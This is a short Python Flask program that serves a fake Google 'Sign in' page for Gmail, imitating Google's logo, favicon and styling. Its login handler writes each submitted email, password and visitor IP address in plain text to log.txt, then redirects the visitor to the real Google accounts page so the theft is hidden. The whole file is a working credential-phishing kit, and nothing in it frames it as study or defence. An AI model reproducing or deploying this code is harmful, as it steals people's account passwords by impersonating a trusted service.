from flask import Flask, request, redirect, send_from_directory
from datetime import datetime
import os

app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
    return """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Sign in – Google accounts</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />                                                                      <link rel="icon" href="https://ssl.gstatic.com/accounts/static/_/ss/k=gaia.gaiafe_main.-1W9vRzc12sE.O/m=gaia_css/favicon.ico" />
  <style>
    body {
      font-family: Roboto, Arial, sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }

    .container {
      width: 100%;
      max-width: 360px;
      background-color: #fff;
      padding: 30px 25px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
      border-radius: 8px;
      box-sizing: border-box;
    }

    .logo {
      text-align: center;
      margin-bottom: 20px;
    }

    .logo img {
      width: 50%;
      max-width: 180px;
      height: auto;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 16px;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #1a73e8;
      border: none;
      color: white;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
      border-radius: 4px;
    }

    .footer {
      text-align: center;
      font-size: 12px;
      color: #666;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo">
    </div>
    <form method="POST" action="/login">
      <h2 style="text-align:center; margin:0;">Sign in</h2>
      <p style="text-align:center; margin: 5px 0 20px;">to continue to Gmail</p>
      <input type="text" name="email" placeholder="Email or phone" required />
      <input type="password" name="password" placeholder="Enter your password" required />
      <button type="submit">Next</button>
    </form>
    <div class="footer">
      Not your computer? Use Guest mode.<br />
      <a href="https://support.google.com/accounts" style="color:#1a73e8;">Learn more</a>
    </div>
  </div>
</body>
</html>
"""

@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email")
    password = request.form.get("password")

    waktu = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)

    with open("log.txt", "a") as f:
        f.write(f"[{waktu}] IP: {ip_address}\nEmail: {email}\nPassword: {password}\n\n")

    return redirect("https://accounts.google.com/")

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=8080)
